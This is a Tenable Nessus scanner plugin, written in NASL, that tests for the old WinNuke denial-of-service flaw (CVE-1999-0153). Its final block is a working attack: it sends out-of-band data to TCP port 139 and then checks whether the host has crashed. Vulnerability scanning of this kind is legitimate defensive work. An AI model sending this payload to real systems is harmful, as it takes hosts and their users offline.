#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10314);
  script_version("$Revision: 1.29 $");
  script_cvs_date("$Date: 2014/05/27 00:36:24 $");

  script_cve_id("CVE-1999-0153");
  script_bugtraq_id(2010);
  script_osvdb_id(1666);

  script_name(english:"Multiple Vendor Out Of Band Data DoS (WinNuke)");
  script_summary(english:"MSG_OOB against the remote host");

  script_set_attribute(attribute:"synopsis", value:"The remote service is vulnerable to denial of service.");
  script_set_attribute(attribute:"description", value:
"It was possible to crash the remote host using the 'Winnuke' attack,
that is to send an OOB message to this port.

An attacker may use this flaw to make this host crash continuously,
preventing the system from working properly.");
  script_set_attribute(attribute:"see_also", value:"http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-10/att-0333/01-winnuke.c");
  script_set_attribute(attribute:"solution", value:"http://support.microsoft.com/default.aspx?scid=kb;EN-US;179129");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"1997/05/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
  script_family(english:"Denial of Service");

  script_require_keys("Settings/ParanoidReport");
  script_require_ports(139);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 139;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  start_denial();
  data = "you are dead";
  send(socket:soc,data:data, option:MSG_OOB);
  close(soc);
  alive = end_denial();
  if(!alive){
  		security_warning(port);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
 }
}
